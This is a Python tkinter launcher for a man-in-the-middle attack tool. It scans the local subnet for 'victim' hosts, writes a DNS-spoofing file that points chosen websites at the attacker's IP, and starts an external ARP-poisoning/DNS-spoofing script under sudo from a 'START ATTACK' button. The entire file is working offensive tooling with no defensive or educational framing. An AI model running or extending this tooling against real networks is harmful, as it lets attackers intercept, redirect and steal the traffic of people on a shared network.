import os, subprocess, socket, threading, tkinter as tk
from tkinter import messagebox, ttk

# --- Automated Network Discovery ---

def get_network_info():
    """Detects Attacker IP and Gateway automatically."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('10.255.255.255', 1))
        local_ip = s.getsockname()[0]
        s.close()
        cmd = "ip route | grep default | awk '{print $3}'"
        gateway_ip = subprocess.check_output(cmd, shell=True).decode().strip()
        return local_ip, gateway_ip
    except:
        return "127.0.0.1", "192.168.1.1"

def scan_network():
    attacker_ip, gateway_ip = get_network_info()
    subnet = ".".join(attacker_ip.split('.')[:-1]) + ".0/24"
    
    try:
        # Improved regex to only match digits and dots (IP addresses)
        output = subprocess.check_output(f"sudo arp-scan {subnet} | grep -oE '([0-9]{{1,3}}\\.){{3}}[0-9]{{1,3}}'", shell=True).decode()
        
        found_ips = []
        for ip in output.split('\n'):
            ip = ip.strip()
            # AUTOMATION: Filter out Attacker, Gateway, Host (.1), and the Interface text
            if ip and ip != attacker_ip and ip != gateway_ip and not ip.endswith(".1") and not ip.endswith(".254"):
                found_ips.append(ip)
        
        return sorted(list(set(found_ips)))
    except Exception as e:
        print(f"Scan error: {e}")
        return ["No victims found"]

# --- UI Actions ---

def refresh_ips():
    """Triggered by the Refresh button to update the victim listbox."""
    status_label.config(text="Scanning network... please wait.")
    root.update()
    
    # Clear the listbox first
    victim_listbox.delete(0, tk.END)
    
    new_ips = scan_network()
    
    # Insert each IP found into the listbox
    if new_ips and new_ips[0] != "No victims found":
        for ip in new_ips:
            victim_listbox.insert(tk.END, ip)
        status_label.config(text=f"Scan complete. Found {len(new_ips)} devices.")
    else:
        status_label.config(text="No devices found.")

def on_save_and_run():
    # Get all selected items from the listbox
    selected_indices = victim_listbox.curselection()
    if not selected_indices:
        messagebox.showerror("Error", "Please select at least one Victim IP.")
        return
    
    # Join them with commas: "192.168.1.5,192.168.1.10"
    victims = ",".join([victim_listbox.get(i) for i in selected_indices])
    
    # Get websites (Comma separated: google.com, facebook.com)
    website_raw = website_var.get().strip()
    if not website_raw:
        messagebox.showerror("Error", "Please enter at least one Target Website.")
        return

    attacker_ip, gateway = get_network_info()

    # Write multiple websites to the DNS file
    dns_file = os.path.join(os.path.dirname(__file__), "dnsSpoofed.txt")
    with open(dns_file, "w") as f:
        site_list = [s.strip() for s in website_raw.split(",")]
        for site in site_list:
            f.write(f"{site}:{attacker_ip}\n")

    # Launch Engine with the victims list
    cmd = ["x-terminal-emulator", "-e", "sudo", "python3", "spoofy.py",
           "-t", victims, "-g", gateway, "-d", dns_file, "--mode", attack_mode.get()]
    subprocess.Popen(cmd)
    status_label.config(text=f"Attack running on {len(selected_indices)} targets.")

# --- The UI ---
root = tk.Tk()
root.title("Automated Modular MITM Framework")
root.geometry("500x600")
root.configure(bg="#d9d9d9")

main_frame = tk.Frame(root, bg="#d9d9d9")
main_frame.pack(expand=True, padx=20)

# 1. Victim Selection (Automated)
tk.Label(main_frame, text="Select Victim IPs (Hold Ctrl to select multiple):", bg="#d9d9d9", font=("Arial", 10, "bold")).pack(pady=5)

victim_listbox = tk.Listbox(main_frame, selectmode="multiple", width=40, height=6, bg="white")
victim_listbox.pack()

tk.Button(main_frame, text="Scan Network", command=refresh_ips, bg="#cfcfcf").pack(pady=5)

# 2. Website Targeting
tk.Label(main_frame, text="Target Website:", bg="#d9d9d9", font=("Arial", 10, "bold")).pack(pady=5)
website_var = tk.StringVar()
tk.Entry(main_frame, textvariable=website_var, width=40).pack()

# 3. Flexible Attack Selection (Removed ARP+SSL)
tk.Label(main_frame, text="Attack Implementation:", bg="#d9d9d9", font=("Arial", 11, "bold")).pack(pady=15)
attack_mode = tk.StringVar(value="full")
modes = [("ARP Poisoning Only", "arp"), ("ARP + DNS Spoofing", "dns"), ("Full MITM Attack", "full")]

for text, val in modes:
    tk.Radiobutton(main_frame, text=text, variable=attack_mode, value=val, bg="#d9d9d9").pack(anchor="w", padx=60)

# 4. Action Button
tk.Button(main_frame, text="START ATTACK", command=on_save_and_run, width=25, height=2, bg="#efefef", relief="raised").pack(pady=30)

# Footer Status
status_label = tk.Label(root, text="Ready", bg="#d9d9d9", font=("Arial", 8, "italic"))
status_label.pack(side="bottom", pady=5)

root.mainloop()
